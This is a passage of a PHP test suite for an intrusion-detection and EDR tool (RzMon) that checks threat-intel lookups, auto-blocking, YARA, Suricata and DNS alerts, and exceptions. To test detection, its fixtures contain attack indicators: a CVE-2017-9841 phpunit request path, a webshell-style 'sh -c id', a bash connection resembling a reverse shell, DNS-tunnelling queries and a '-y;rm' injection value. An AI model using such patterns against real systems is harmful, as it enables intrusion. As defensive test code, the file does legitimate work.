        str_contains($url, 'abuseipdb.com/api/v2/check') => [200, json_encode(['data' => $bad ? ['abuseConfidenceScore' => 100, 'totalReports' => 523, 'numDistinctUsers' => 210, 'usageType' => 'Data Center/Web Hosting/Transit', 'isp' => 'Evil BV', 'isTor' => false]
            : ['abuseConfidenceScore' => 0, 'totalReports' => 0, 'numDistinctUsers' => 0, 'isWhitelisted' => false]])],
        str_contains($url, 'abuseipdb.com/api/v2/report') => [200, '{"data":{"abuseConfidenceScore":100}}'],
        str_contains($url, 'greynoise') => str_contains($url, '203.0.113.70') ? [200, '{"noise":true,"riot":false,"classification":"benign","name":"Shodan.io"}']
            : ($bad ? [200, '{"noise":true,"riot":false,"classification":"malicious","name":"unknown"}'] : [404, '{"message":"IP not observed"}']),
        str_contains($url, 'internetdb.shodan.io') => [404, '{"detail":"No information available"}'],
        str_contains($url, 'hashlookup.circl.lu') => str_contains($url, str_repeat('b', 64)) ? [200, '{"FileName":"./usr/bin/ls","source":"NSRL"}'] : [404, '{}'],
        str_contains($url, 'mb-api.abuse.ch') => str_contains((string) $body, str_repeat('e', 64)) ? [200, '{"query_status":"ok","data":[{"signature":"XMRig","file_type":"elf","tags":["miner"]}]}'] : [200, '{"query_status":"hash_not_found"}'],
        str_contains($url, 'threatfox') => [200, json_encode(['query_status' => 'ok', 'data' => [['ioc' => '198.51.100.66:443', 'ioc_type' => 'ip:port', 'malware_printable' => 'Cobalt Strike', 'threat_type' => 'botnet_cc'],
            ['ioc' => 'c2.badguys.example', 'ioc_type' => 'domain', 'malware_printable' => 'AsyncRAT', 'threat_type' => 'botnet_cc']]])],
        str_contains($url, 'torbulkexitlist') => [200, "198.51.100.200\n198.51.100.201\n"],
        str_contains($url, 'urlhaus') => [200, "# URLhaus\n127.0.0.1\tmalware.evil.example\n127.0.0.1\tdrop.bad.example\n"],
        default => [0, ''],
    };
};
save_setting('ti_abuseipdb_key', 'test-key');
save_setting('ti_abusech_key', 'test-abusech');
save_setting('ids_mode', 'block');
$v = ThreatIntel::lookupIp('203.0.113.61');
ok($v['verdict'] === 'malicious' && $v['score'] === 100 && str_contains(implode(' ', $v['why']), 'AbuseIPDB 100%'), 'AbuseIPDB 100% + GreyNoise kwaadaardig → bekende aanvaller');
ok(ThreatIntel::lookupIp('203.0.113.70')['verdict'] === 'benign', 'GreyNoise: onschuldige scanner (Shodan) → onschuldig');
ok(ThreatIntel::lookupIp('203.0.113.80')['verdict'] === 'clean', 'niets bekend → niet bekend als aanvaller');
// Wachtrij: login van buiten vanaf een bekende aanvaller → critical, geblokkeerd, oordeel bij het incident
q('DELETE FROM ti_ip');
$li = Ids::raise($hc, 1, 'ssh_login', 'root|203.0.113.60', 'SSH-login van buiten: root vanaf 203.0.113.60', 'Geslaagde login', '203.0.113.60');
$wp = Ids::raise($hc, 1, 'web_payload', 'swag|203.0.113.70', 'Webaanval vanaf 203.0.113.70: scanner', 'scanner', '203.0.113.70');
ok((int) q('SELECT COUNT(*) FROM ti_queue')->fetchColumn() >= 2, 'nieuwe incidenten met een IP van buiten in de wachtrij');
Chain::reset();
ThreatIntel::cron();
$li2 = q('SELECT * FROM ids_incidents WHERE id = ?', [$li])->fetch();
ok((int) $li2['severity'] === 2 && str_contains((string) $li2['detail'], '🌐') && str_contains((string) $li2['detail'], 'bekende aanvaller'), 'login vanaf een bekende aanvaller → critical, met het oordeel');
ok((int) q("SELECT COUNT(*) FROM ids_blocks WHERE host_id = ? AND ip = '203.0.113.60' AND removed_at IS NULL", [$hc['id']])->fetchColumn() === 1, 'bekende aanvaller automatisch geblokkeerd');
ok(q('SELECT status FROM ids_incidents WHERE id = ?', [$wp])->fetchColumn() === 'done', 'webaanval van een onschuldige scanner vanzelf afgehandeld');
ok(ThreatIntel::listed('i', '198.51.100.200')['src'] === 'tor' && (ThreatIntel::domain('x.malware.evil.example')['src'] ?? '') === 'urlhaus'
    && (ThreatIntel::domain('c2.badguys.example')['info'] ?? '') === 'AsyncRAT botnet_cc', 'lijsten opgehaald: Tor, URLhaus en ThreatFox');
ok(ThreatIntel::domain('example') === null && ThreatIntel::domain('evil.example') === null, 'alleen het domein zelf of een subdomein telt');
// Verbinding met een adres van ThreatFox: meteen critical en proces stoppen
$r = Edr::process($hc, ['ev' => [['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 777, 'st' => 70, 'comm' => 'updater', 'exe' => '/opt/x/updater', 'u' => 'root', 'rip' => '198.51.100.66', 'rp' => 443, 'lp' => 50000]]]);
$c2 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'ti_ip' AND ip = '198.51.100.66'", [$hc['id']])->fetch();
ok($c2 && (int) $c2['severity'] === 2 && str_contains((string) $c2['detail'], 'Cobalt Strike') && ($r['edr_kill'] ?? null) === [[777, 70]], 'verbinding met een botnet-server (ThreatFox) → critical, proces gestopt');
// Bestanden: bekende malware (MalwareBazaar) en een bekend goed bestand (CIRCL)
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/opt/tools/xm', 'size' => 9000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('e', 64)],
    ['k' => 'f', 't' => time(), 'path' => '/opt/tools/ls', 'size' => 9000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('b', 64)]]]);
ThreatIntel::cron();
$mw = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'ti_malware'", [$hc['id']])->fetch();
ok($mw && (int) $mw['severity'] === 2 && str_contains((string) $mw['title'], 'XMRig') && str_contains((string) $mw['title'], '/opt/tools/xm'), 'bekende malware (MalwareBazaar) → critical: ' . ($mw['title'] ?? '-'));
ok((ThreatIntel::hash(str_repeat('b', 64))['verdict'] ?? '') === 'known_good', 'bekend goed bestand (CIRCL)');
// Aanval op een lek dat de server echt heeft
q("INSERT INTO vuln_findings (host_id, package, version, source, vuln_id, cve, fixed_version, first_seen) VALUES (?, 'phpunit', '5.6.2', 'composer', 'GHSA-x', 'CVE-2017-9841', '5.6.3', NOW())", [$hc['id']]);
Inspect::requests($hc, [['203.0.113.90', time(), 'POST', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 200, 10, 'curl/8', '-']]);
$wc = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'web_cve'", [$hc['id']])->fetch();
ok($wc && (int) $wc['severity'] === 2 && str_contains((string) $wc['detail'], 'phpunit 5.6.2'), 'aanval op een lek dat deze server heeft (CVE-2017-9841) → critical');
// Melden bij AbuseIPDB (alleen als het aan staat), één keer per dag
$tiLog = [];
ThreatIntel::cron();
ok(!array_filter($tiLog, static fn($l) => str_contains($l, '/report')), 'melden staat standaard uit');
save_setting('ti_report', '1');
ThreatIntel::cron();
ThreatIntel::cron();
ok(count(array_filter($tiLog, static fn($l) => str_contains($l, '/report'))) === count(array_unique(q("SELECT ip FROM ids_blocks WHERE auto = 1 AND created_at >= NOW() - INTERVAL 1 HOUR AND ip NOT LIKE '10.%' AND ip NOT LIKE '192.168.%'")->fetchAll(PDO::FETCH_COLUMN)))
    && q("SELECT reported_at FROM ti_ip WHERE ip = '203.0.113.60'")->fetchColumn(), 'geblokkeerde aanvallers gemeld bij AbuseIPDB, één keer per IP');
save_setting('ti_report', '0');
ThreatIntel::$http = null;

section('Netwerk: YARA, Suricata en DNS via AdGuard (1.113.0)');
Chain::reset();
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/.x/conf.json', 'size' => 300, 'elf' => 0, 'x' => 1, 'sha' => str_repeat('1', 64), 'yara' => 'rz_cryptominer']]]);
$y = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-yara|%'", [$hc['id']])->fetch();
ok($y && (int) $y['severity'] === 2, 'YARA-treffer (cryptominer) → critical');
Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/tool', 'size' => 300, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('2', 64), 'yara' => 'rz_info_upx_packed']]]);
ok((int) q("SELECT severity FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-yara-info|%'", [$hc['id']])->fetchColumn() === 1, 'alleen een aanwijzing (UPX) → warning');
// 1.127.1: de werkmap van dracut (nieuwe initramfs na een kernel-update) is geen 'nieuw programma in /tmp'
$drop = static fn(string $path) => (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-drop-elf|%' AND detail LIKE ?", [$hc['id'], '%' . $path . '%'])->fetchColumn();
foreach (['/var/tmp/dracut.CbpkW9/initramfs/usr/bin/ps', '/var/tmp/dracutx/ps', '/var/tmp/x/dracut.CbpkW9/ps'] as $k => $p) {
    Edr::process($hc, ['ev' => [['k' => 'f', 't' => time(), 'path' => $p, 'size' => 144536, 'elf' => 1, 'x' => 1, 'sha' => str_repeat((string) (3 + $k), 64)]]]);
}
ok($drop('/var/tmp/dracut.CbpkW9/') === 0, 'programma in de werkmap van dracut (kernel-update) → geen melding');
ok($drop('/var/tmp/dracutx/') === 1 && $drop('/var/tmp/x/dracut.CbpkW9/') === 1, 'alleen de echte vorm dracut.XXXXXX direct in /tmp of /var/tmp wordt overgeslagen');
$r = Edr::process($hc, ['ev' => [], 'info' => ['yara' => 'ok', 'ysha' => '']]);
ok(base64_decode($r['edr_yara'] ?? '') === Edr::yaraRules() && str_contains(Edr::yaraRules(), 'rule rz_php_webshell_eval'), 'YARA-regels naar de agent als hij ze nog niet heeft');
ok(!isset(Edr::process($hc, ['ev' => [], 'info' => ['yara' => 'ok', 'ysha' => hash('sha256', Edr::yaraRules())]])['edr_yara']), 'niet opnieuw als de agent de nieuwste regels heeft');
// Suricata
Suricata::process($hc, [['2026-10-28T10:00:01+0100', '203.0.113.120', 51234, '10.0.0.3', 22, 'TCP', 2001219, 'ET EXPLOIT Something', 'Attempted Administrator Privilege Gain', 1, 'allowed'],
    ['2026-10-28T10:00:02+0100', '10.0.0.3', 40000, '198.51.100.140', 443, 'TCP', 2030000, 'ET MALWARE Cobalt Strike Beacon', 'A Network Trojan was detected', 2, 'allowed'],
    ['2026-10-28T10:00:03+0100', '203.0.113.121', 1, '10.0.0.3', 80, 'TCP', 2100498, 'GPL ATTACK_RESPONSE id check returned root', 'Potentially Bad Traffic', 3, 'allowed']]);
$s1 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'suricata' AND ip = '203.0.113.120'", [$hc['id']])->fetch();
ok($s1 && (int) $s1['severity'] === 2 && str_contains((string) $s1['detail'], '⛔'), 'Suricata ernst 1 van buiten → critical en geblokkeerd');
$s2 = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'suricata' AND ip = '198.51.100.140'", [$hc['id']])->fetch();
ok($s2 && (int) $s2['severity'] === 1 && (int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'suricata' AND FIND_IN_SET('command-and-control', tactics)", [$hc['id']])->fetchColumn() >= 1,
    'Suricata C2 van een eigen server naar buiten → warning, signaal Op afstand besturen');
ok(!q("SELECT 1 FROM ids_incidents WHERE type = 'suricata' AND ip = '203.0.113.121'")->fetchColumn(), 'Suricata ernst 3: alleen een signaal');
// DNS via AdGuard
$e = static fn(string $client, string $name, string $reason = 'NotFilteredNotFound', string $status = 'NOERROR', array $answer = []) =>
    ['client' => $client, 'client_info' => ['name' => 'tv-woonkamer'], 'question' => ['name' => $name, 'type' => 'A'], 'reason' => $reason, 'status' => $status, 'answer' => $answer, 'time' => date('c')];
$before = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type IN ('dns_bad', 'dns_odd')")->fetchColumn();
$list = [$e('192.168.1.77', 'cdn.malware.evil.example'), $e('10.0.0.3', 'c2.badguys.example', 'FilteredBlackList'), $e('192.168.1.78', 'login-bank.example', 'FilteredSafeBrowsing'),
    $e('192.168.1.79', 'ok.example', 'NotFilteredNotFound', 'NOERROR', [['type' => 'A', 'value' => '198.51.100.66']]), $e('192.168.1.80', 'www.nu.nl')];
for ($i = 0; $i < 45; $i++) {
    $list[] = $e('192.168.1.81', bin2hex(random_bytes(16)) . '.exfil.example');
}
for ($i = 0; $i < 35; $i++) {
    $list[] = $e('192.168.1.82', 'xq' . substr(str_shuffle('bcdfghjklmnpqrstvwxz0123456789'), 0, 12) . '.com', 'NotFilteredNotFound', 'NXDOMAIN');
}
DnsWatch::check($list);
$dns = q("SELECT title, severity, dkey FROM ids_incidents WHERE type IN ('dns_bad', 'dns_odd') ORDER BY id")->fetchAll();
$keys = array_column($dns, 'dkey');
ok(in_array('192.168.1.77|cdn.malware.evil.example', $keys, true) && (int) $dns[array_search('192.168.1.77|cdn.malware.evil.example', $keys)]['severity'] === 2, 'malwaredomein (URLhaus, subdomein) → critical');
ok((int) $dns[array_search('10.0.0.3|c2.badguys.example', $keys)]['severity'] === 1 && (int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'dns_bad'", [$hc['id']])->fetchColumn() === 1,
    'botnetdomein dat AdGuard tegenhield → warning; een eigen server krijgt een signaal');
ok(in_array('192.168.1.78|login-bank.example', $keys, true) && in_array('192.168.1.79|ok.example', $keys, true) && !in_array('192.168.1.80|www.nu.nl', $keys, true),
    'AdGuard Safe Browsing en een antwoord naar een botnet-server gemeld; gewoon domein niet');
ok(in_array('192.168.1.81|tunnel|exfil.example', $keys, true) && in_array('192.168.1.82|dga', $keys, true), 'DNS-tunnel en verzonnen domeinen herkend');
ok(count($dns) - $before === 6, 'precies 6 meldingen');
// De cron: de eerste keer alleen vastleggen, daarna alleen de nieuwe regels
save_setting('adguard_urls', 'http://adguard.test');
$ag = [['data' => [['time' => date('c', time() - 60)] + $e('192.168.1.90', 'old.malware.evil.example')]], ['data' => [['time' => date('c', time() + 5)] + $e('192.168.1.91', 'new.malware.evil.example'),
    ['time' => date('c', time() - 60)] + $e('192.168.1.90', 'old.malware.evil.example')]]];
$call = 0;
DnsWatch::$fetch = static function () use (&$call, $ag) { return [$ag[min($call++, 1)], null]; };
DnsWatch::cron();
DnsWatch::cron();
ok(!q("SELECT 1 FROM ids_incidents WHERE dkey = '192.168.1.90|old.malware.evil.example'")->fetchColumn() && q("SELECT 1 FROM ids_incidents WHERE dkey = '192.168.1.91|new.malware.evil.example'")->fetchColumn(),
    'AdGuard-log: alleen nieuwe regels (de eerste keer alleen vastleggen)');
DnsWatch::$fetch = null;
save_setting('adguard_urls', '');

section('RzMon zelf: toegestaan, nooit ingrijpen (1.114.0)');
ok(in_array("0\tedrself\t" . SM_ROOT, array_map(static fn($l) => implode("\t", array_slice(explode("\t", $l), 0, 3)), Edr::agentLines($hc)), true), 'agent krijgt de map van RzMon (om RzMon zelf te herkennen)');
Chain::reset();
$sig0 = (int) q('SELECT COUNT(*) FROM ids_signals')->fetchColumn();
$inc0 = (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn();
$r = Edr::process($hc, ['ev' => [
    ['k' => 'x', 't' => time(), 'pid' => 8001, 'st' => 5, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'pc' => 'php-fpm8.2', 'cwd' => SM_ROOT . '/public', 'cmd' => 'sh -c timeout 2 getent hosts 203.0.113.5', 'own' => 'rzmon'],
    ['k' => 'x', 't' => time(), 'pid' => 8002, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/ss', 'comm' => 'ss', 'pc' => 'rzmon-agent.sh', 'cmd' => 'ss -tnpH', 'own' => 'agent'],
    ['k' => 'x', 't' => time(), 'pid' => 8003, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/awk', 'comm' => 'awk', 'pc' => 'rzmon-agent.sh', 'cmd' => 'awk {print}', 'own' => 'agent'],
    ['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 8004, 'st' => 6, 'comm' => 'bash', 'exe' => '/usr/bin/bash', 'u' => 'root', 'rip' => '203.0.113.200', 'rp' => 4444, 'lp' => 50000, 'own' => 'agent']]]);
ok($r === [] && (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn() === $inc0 && (int) q('SELECT COUNT(*) FROM ids_signals')->fetchColumn() === $sig0,
    'RzMon zelf (ook iets wat op een webshell lijkt): geen incident, niets gestopt, niet voor ketens');
$would = q("SELECT data FROM edr_events WHERE host_id = ? AND own = 'rzmon' AND kind = 'x'", [$hc['id']])->fetchColumn();
ok($would && str_contains((string) json_decode((string) $would, true)['_would'], 'Webserver start een shell'), 'groene regel: zou rz-webshell raken, maar is RzMon zelf');
$sum = json_decode((string) q("SELECT data FROM edr_events WHERE host_id = ? AND kind = 'o' AND own = 'agent' ORDER BY id DESC LIMIT 1", [$hc['id']])->fetchColumn(), true);
ok(($sum['n']['exec'] ?? 0) === 2 && count($sum['s'] ?? []) === 2, 'agent: één samengevatte groene regel per rapport (2 processen)');
ok(q("SELECT 1 FROM edr_events WHERE host_id = ? AND own = 'agent' AND kind = 'n'", [$hc['id']])->fetchColumn() !== false, 'verbinding van de agent die op een reverse shell lijkt: groen, met de regel erbij');
$f = Edr::feed(50, (int) $hc['id']);
$f2 = Edr::feed(50, (int) $hc['id'], false, 0, false);
ok(array_filter($f, static fn($e) => $e['own'] === 'agent' && $e['kind'] === 'own') && !array_filter($f2, static fn($e) => $e['own'] !== null), 'Live: groene regels, en te verbergen');
// Verkeer van of naar RzMon (Suricata, DNS): toegestaan
save_setting('rz_own_ips', json_encode(['10.0.0.9']));
$inc0 = (int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn();
Suricata::process($hc, [['2026-10-28T10:00:01+0100', '10.0.0.9', 40000, '10.0.0.3', 22, 'TCP', 2010937, 'ET SCAN Suspicious inbound to SSH (nmap)', 'Attempted Information Leak', 1, 'allowed']]);
DnsWatch::check([['client' => '10.0.0.9', 'client_info' => ['name' => 'rzmon'], 'question' => ['name' => 'x.malware.evil.example'], 'reason' => 'NotFilteredNotFound', 'status' => 'NOERROR', 'time' => date('c')]]);
ok((int) q('SELECT COUNT(*) FROM ids_incidents')->fetchColumn() === $inc0 && (int) q("SELECT COUNT(*) FROM edr_events WHERE own = 'net' AND kind IN ('s', 'd')")->fetchColumn() === 2,
    'netwerkscan van RzMon (Suricata) en DNS van RzMon: geen incident, wel een groene regel');
ok(Ids::protectedIp('10.0.0.9') && Ids::autoBlock($hc, '10.0.0.9', 'test') === null, 'RzMon wordt nooit geblokkeerd');

section('Bescherming: waarom, trigger en actie (1.115.0)');
save_setting('ids_mode', 'block');
Protect::reset();
$b = Ids::autoBlock($hd, '203.0.113.150', 'Brute force: 12 mislukte SSH-logins in 10 min');
$bf = Ids::raise($hd, 1, 'bruteforce', '203.0.113.150', 'Brute force op SSH vanaf 203.0.113.150 (12 pogingen in 10 min)', 'Gebruikers: root, admin · ⛔ ' . $b, '203.0.113.150');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$bf])->fetch());
ok(($x['card']['id'] ?? '') === 'bruteforce' && str_contains($x['why'], 'Meer dan 10 mislukte SSH-logins binnen 10 minuten'), 'waarom: de regel met de drempel');
ok($x['trigger'] === 'Gebruikers: root, admin', 'trigger: de feiten, zonder de actie (' . $x['trigger'] . ')');
ok(($x['actions'][0]['t'] ?? '') === 'block' && $x['actions'][0]['ok'] === true && str_contains($x['actions'][0]['text'], 'IP geblokkeerd tot'), 'actie: IP geblokkeerd, met de tijd');
Ids::unblock((int) q("SELECT id FROM ids_blocks WHERE ip = '203.0.113.150' AND removed_at IS NULL")->fetchColumn(), 'Rehman');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$bf])->fetch());
ok(str_contains($x['actions'][0]['text'], 'gedeblokkeerd door Rehman'), 'stand bijgewerkt: gedeblokkeerd door wie');
$r = Edr::process($hd, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 9100, 'st' => 44, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'id'], 'cmd' => 'sh -c id', 'pc' => 'php-fpm8.2']]]);
$ws = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-webshell|%' ORDER BY id DESC LIMIT 1", [$hd['id']])->fetch();
$x = Protect::describe($ws);
ok(($x['card']['id'] ?? '') === 'webshell' && str_contains($x['actions'][0]['text'], 'proces 9100 wordt gestopt') && str_contains($x['why'], 'webserver'), 'webshell: waarom uit de regel, proces wordt gestopt');
q("UPDATE ids_kills SET done_at = NOW(), result = ? WHERE pid = 9100", [t('gestopt')]);
ok(Protect::describe($ws)['actions'][0]['ok'] === true, 'stand bijgewerkt: gestopt, bevestigd door de agent');
save_setting('ids_mode', 'learn');
$wl = Ids::raise($hd, 1, 'web_payload', 'swag|203.0.113.151', 'Webaanval vanaf 203.0.113.151: SQL-injectie', '1 verdachte verzoek(en)', '203.0.113.151');
$x = Protect::describe(q('SELECT * FROM ids_incidents WHERE id = ?', [$wl])->fetch());
ok(($x['actions'][0]['t'] ?? '') === 'learn' && str_contains($x['actions'][0]['text'], 'IP blokkeren'), 'modus Leren: wat RzMon in Blokkeren zou doen');
$p = Protect::pushText($bf);
ok(str_contains($p, 'Waarom: Meer dan 10') && str_contains($p, 'Trigger: Gebruikers') && str_contains($p, 'Actie: ↩'), 'Pushover: waarom, trigger en actie');
$all = Protect::describeAll(q('SELECT * FROM ids_incidents WHERE id IN (?, ?)', [$bf, $wl])->fetchAll());
ok(($all[$bf]['card'] ?? '') === 'bruteforce' && ($all[$wl]['acts'][0][2] ?? '') === 'learn', 'lijst: kaart en acties per incident');
$ov = Protect::overview();
$bfc = array_values(array_filter($ov['cards'], static fn($c) => $c['id'] === 'bruteforce'))[0] ?? [];
ok($ov['total'] >= 25 && ($bfc['n'] ?? 0) >= 1 && count(array_filter($ov['cards'], static fn($c) => $c['toggle'] !== null)) >= 18, 'Bescherming: kaarten met schakelaar en cijfers (' . $ov['total'] . ')');
// Een oud incident (zonder modus, met de actie alleen in de tekst) krijgt toch een uitleg
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip) VALUES (?, 2, 'revshell', 'x', 'Reverse shell', 'bash -i · ⛔ server geïsoleerd (24 uur)', NULL)", [$hd['id']]);
$x = Protect::describe(q('SELECT * FROM ids_incidents ORDER BY id DESC LIMIT 1')->fetch());
ok(($x['card']['id'] ?? '') === 'revshell' && in_array('isolate', array_column($x['actions'], 't'), true), 'oud incident: kaart en isolatie uit de tekst');
save_setting('ids_mode', 'learn');

section('Moderne IDS-pagina (1.117.0)');
ok(setting('ids_modern') === '1', 'moderne weergave staat standaard aan');
save_setting('ids_modern', '0');
Installer::runSchema();
ok(setting('ids_modern') === '0', 'een update zet de keuze voor de compacte weergave niet terug');
save_setting('ids_modern', '1');

section('Snelheid (1.119.0)');
ok(class_exists('SnmpDown') && class_exists('VulnFetchError') && function_exists('t'), 'klassen worden pas geladen als ze nodig zijn, ook de hulpklassen');
Perf::lap('start');
Perf::lap('testonderdeel');
$pr = Perf::report();
ok(in_array('testonderdeel', array_column($pr['cron'], 'name'), true) && isset($pr['opcache']['on']) && count($pr['tables']) > 5, 'snelheidsmeter: cron-onderdeel, OPcache en tabellen');
save_setting('perf_on', '0');
Perf::lap('uit');
ok(!in_array('uit', array_column(Perf::report()['cron'], 'name'), true), 'snelheidsmeter uit: niets meer vastgelegd');
save_setting('perf_on', '1');
// 1.125.0: eigen pakketnamen bij installeren
ok(Edr::parsePkgs('audit, audispd-plugins  audit') === ['audit', 'audispd-plugins'] && is_string(Edr::parsePkgs('-y;rm')) && is_string(Edr::parsePkgs('../x'))
    && is_string(Edr::parsePkgs(implode(' ', range(1, 11)))) && is_string(Edr::parsePkgs('  ')), 'eigen pakketnamen: alleen gewone namen, hooguit 10');
$pct = static fn($ok, $n) => (int) $n > 0 ? round((int) $ok / (int) $n * 100, 3) : null;
save_setting('stats_daily_at', '0');
Analytics::cron();
$full = (new ReflectionMethod('Stats', 'uptimeFull'))->invoke(null, $pct);
$fast = Stats::uptime();
ok(array_map(static fn($x) => $x['h24'], $full) == array_map(static fn($x) => $x['h24'], $fast), 'beschikbaarheid uit de dagtotalen: 24 uur gelijk aan de volledige berekening');


section('Uitzonderingen en eigen processen (1.132.0)');
save_setting('ids_enabled', '1');
save_setting('ids_mode', 'learn');
Edr::reset();
Exceptions::reset();
// Matchen: programma (naam of pad), pad met **, IP-netwerk; zonder voorwaarden nooit raak
ok(Exceptions::matches(['program' => ['Plex Media Serv*']], ['program' => 'Plex Media Serv']) && Exceptions::matches(['program' => ['/usr/bin/sed'], 'parent' => ['run-parts']], ['program' => '/usr/bin/sed', 'parent' => 'run-parts'])
    && !Exceptions::matches(['program' => ['sed'], 'parent' => ['run-parts']], ['program' => '/usr/bin/sed', 'parent' => 'bash'])
    && Exceptions::matches(['path' => ['/var/tmp/dracut.*/**']], ['path' => '/var/tmp/dracut.Ab12Cd/initramfs/usr/bin/ps'])
    && !Exceptions::matches(['path' => ['/var/tmp/dracut.*/**']], ['path' => '/var/tmp/x/dracut.Ab12Cd/ps'])
    && Exceptions::matches(['ip' => ['86.85.247.0/24']], ['ip' => '86.85.247.15']) && !Exceptions::matches([], ['program' => 'x']), 'voorwaarden: programma, ouder, pad met **, netwerk; zonder voorwaarden nooit raak');
$bad = static function (array $in): bool { try { Exceptions::clean($in); return false; } catch (InvalidArgumentException) { return true; } };
ok($bad(['name' => 'alles']) && $bad(['name' => 'yara', 'rule' => 'rz-yara', 'cond' => ['program' => 'x']]) && $bad(['name' => 'ip', 'cond' => ['ip' => 'geen-ip']])
    && !$bad(['name' => 'ok', 'cond' => ['program' => "sed\nawk"]]), 'een uitzondering voor alles, voor malware (YARA) of met een fout IP kan niet');
// EDR: webserver start een shell → incident; met een uitzondering niet meer, wel een groene regel en een teller
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$hc0 = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn();
$xid = Exceptions::save(['name' => 'Healthchecks', 'target' => 'edr', 'rule' => 'rz-webshell', 'scope' => 'host', 'scope_val' => $ha,
    'cond' => ['parent' => ['uwsgi'], 'cmd' => ['manage.py sendreports']]], 'ci');
$hcx = ['k' => 'x', 't' => time(), 'pid' => 6060, 'st' => 1, 'uid' => 1000, 'u' => 'rehman', 'exe' => '/usr/bin/python3.14', 'comm' => 'python3', 'argv' => ['python3', './manage.py', 'sendreports', '--loop'], 'cmd' => 'python3 ./manage.py sendreports --loop', 'pc' => 'uwsgi'];
Edr::process($host, ['ev' => [$hcx]]);
$row = q("SELECT * FROM edr_events WHERE host_id = ? ORDER BY id DESC LIMIT 1", [$ha])->fetch();
$d = json_decode((string) $row['data'], true);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $hc0 && $row['own'] === 'exc' && $d['_exc'] === 'Healthchecks' && str_contains((string) ($d['_would'] ?? ''), 'shell'),
    'uitzondering raak: geen incident, wel een groene regel met de naam en welke regel het zou raken');
ok((int) q('SELECT hits FROM ids_exceptions WHERE id = ?', [$xid])->fetchColumn() === 1, 'teller van de uitzondering');
$hcx['pid'] = 6061; $hcx['cmd'] = 'sh -c id'; $hcx['argv'] = ['sh', '-c', 'id']; $hcx['exe'] = '/usr/bin/dash';
Edr::process($host, ['ev' => [$hcx]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $hc0 + 1, 'een andere opdracht van dezelfde webserver blijft gewoon een incident');
// Nooit: YARA blijft altijd, ook met een uitzondering op het pad
Exceptions::save(['name' => 'alles in tmp', 'target' => 'edr', 'cond' => ['path' => ['/tmp/**']]], 'ci');
Edr::process($host, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/miner', 'size' => 9, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('7', 64), 'yara' => 'rz_cryptominer']]]);
ok((bool) q("SELECT 1 FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-yara|%' AND detail LIKE '%/tmp/miner%'", [$ha])->fetchColumn(), 'YARA-treffer blijft een incident, ook met een uitzondering op het pad');
// IDS: root-login vanaf je eigen adres
Exceptions::save(['name' => 'Thuis', 'target' => 'ids', 'rule' => 'rootlogin', 'cond' => ['ip' => ['86.85.247.15']]], 'ci');
ok(Exceptions::ids($host, 'rootlogin', '86.85.247.15', 'Root-login', '', '86.85.247.15') !== null && Exceptions::ids($host, 'rootlogin', '203.0.113.9', 'Root-login', '', '203.0.113.9') === null
    && Exceptions::ids($host, 'decoy_port', 'x', 'Lokaas', '', '86.85.247.15') === null, 'IDS: root-login vanaf thuis uitgezonderd, van elders niet; lokaas nooit');
// Sets: met één knop, en geen dubbele regels
$n1 = Exceptions::addSet('plex', 'ci'); $n2 = Exceptions::addSet('plex', 'ci');
ok($n1 === 1 && $n2 === 0 && Exceptions::ids($host, 'out_country', 'Plex Media Serv|GB', 'Uitgaand', '', '1.2.3.4') !== null, 'set Plex met één knop toegevoegd (en niet dubbel); Plex naar elk land uitgezonderd');
// Voorstellen uit de meldingen, met één knop toevoegen
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip, hits) VALUES (?, 1, 'out_country', 'rclone|US', 'Uitgaande verbinding naar US: rclone', '', '9.9.9.9', 40), (?, 1, 'out_country', 'rclone|IE', 'Uitgaande verbinding naar IE: rclone', '', '9.9.9.8', 25), (?, 1, 'out_country', 'Plex Media Serv|GB', 'Uitgaande verbinding naar GB: Plex Media Serv', '', '8.8.4.4', 99)", [$ha, $ha, $ha]);
